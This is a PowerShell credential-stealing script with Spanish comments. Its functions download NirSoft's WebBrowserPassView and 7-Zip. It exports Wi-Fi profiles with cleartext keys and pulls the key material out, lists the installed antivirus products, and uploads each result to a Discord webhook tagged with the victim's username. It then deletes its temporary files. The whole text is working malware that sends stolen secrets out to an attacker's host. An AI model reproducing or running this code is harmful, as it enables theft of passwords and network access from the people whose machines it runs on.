$desktop = ([Environment]::GetFolderPath("Desktop"))
function Get-Nirsoft {

  mkdir \temp 
  cd \temp
  # Descargar WebBrowserPassView desde NirSoft
  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  # Descargar 7-Zip para extraer archivos
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip

}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

# Configurar el cuerpo de la solicitud al webhook de Discord
$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
    # Enviar texto al webhook de Discord
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
};

if (-not ([string]::IsNullOrEmpty($file))){
    # Subir archivo al webhook de Discord
    curl.exe -F "file1=@$file" $DiscordUrl
}
}

function Wifi {
    # Crear directorio temporal para exportar perfiles de Wi-Fi
    New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
    Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"
    netsh wlan export profile key=clear
    # Extraer las contraseñas de los perfiles Wi-Fi y guardar en un archivo temporal
    Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
    # Subir las contraseñas Wi-Fi al webhook de Discord
    Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
    # Limpiar archivos temporales
    Set-Location -Path "$env:temp"
    Remove-Item -Path "$env:temp/js2k3kd4nne5dhsk" -Force -Recurse
    rm $desktop\0.txt
}

function Del-Nirsoft-File {
    # Eliminar archivos de NirSoft y limpiar directorios
    cd C:\
    rmdir -R \temp
}

function version-av {
    # Crear directorio temporal y extraer información del antivirus
    mkdir \temp 
    cd \temp
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
    # Subir resultados al webhook de Discord
    Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
    # Limpiar directorios temporales
    cd C:\
    rmdir -R \temp
}
